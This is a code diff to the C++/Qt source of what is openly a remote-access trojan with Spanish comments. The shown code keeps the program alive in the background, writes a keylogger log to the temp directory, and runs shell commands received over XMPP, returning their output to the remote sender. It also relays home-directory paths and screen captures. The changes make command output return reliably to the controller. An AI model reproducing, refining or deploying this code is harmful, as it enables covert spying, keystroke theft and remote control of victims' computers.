@@ -46,6 +46,7 @@ void MainWindow::inicio(){
     cargarConfiguracion();
     listarProcesos();
     this->generarVentanaChat();
+    QApplication::setQuitOnLastWindowClosed(false);
     manager = new QXmppTransferManager;
     connect(manager,SIGNAL(fileReceived(QXmppTransferJob*)),this,SLOT(llegadaDatosArchivo(QXmppTransferJob*)));
     cliente.addExtension(manager);
@@ -73,7 +74,6 @@ void MainWindow::inicio(){
     connect(this,SIGNAL(procesar(QImage,int)),&capturacion,SLOT(procesarImagen(QImage,int)));
     connect(&capturacion,SIGNAL(enviar(QByteArray)),this,SLOT(enviarCaptura(QByteArray)));
     connect(&cliente,SIGNAL(presenceReceived(QXmppPresence)),this,SLOT(recibidaPresencia(QXmppPresence)));
-    QApplication::setQuitOnLastWindowClosed(false);
     //Crear si no esta creado el archivo de log para el keylogger
     log.setFileName(directorio.tempPath() + "/log"); //archivo de log del keylogger
     log.open(QFile::WriteOnly);
@@ -270,7 +270,6 @@ void MainWindow::llegadaDatos(const QXmppMessage &mensaje) {
         QString salidaShell;
         salidaShell = "shell|@|" + shell(parametros[1].toLatin1());
         cliente.sendMessage(from,salidaShell);
-
     }
     if (parametros[0] == "home"){
         cliente.sendMessage(from,"home|@|" + QDir::homePath());
@@ -530,6 +529,7 @@ QString MainWindow::shell(QString comando){
     #else
         consola.start(comando);
     #endif
+    consola.waitForReadyRead();
     return consola.readAllStandardOutput();
 }
 void MainWindow::reiniciar(){
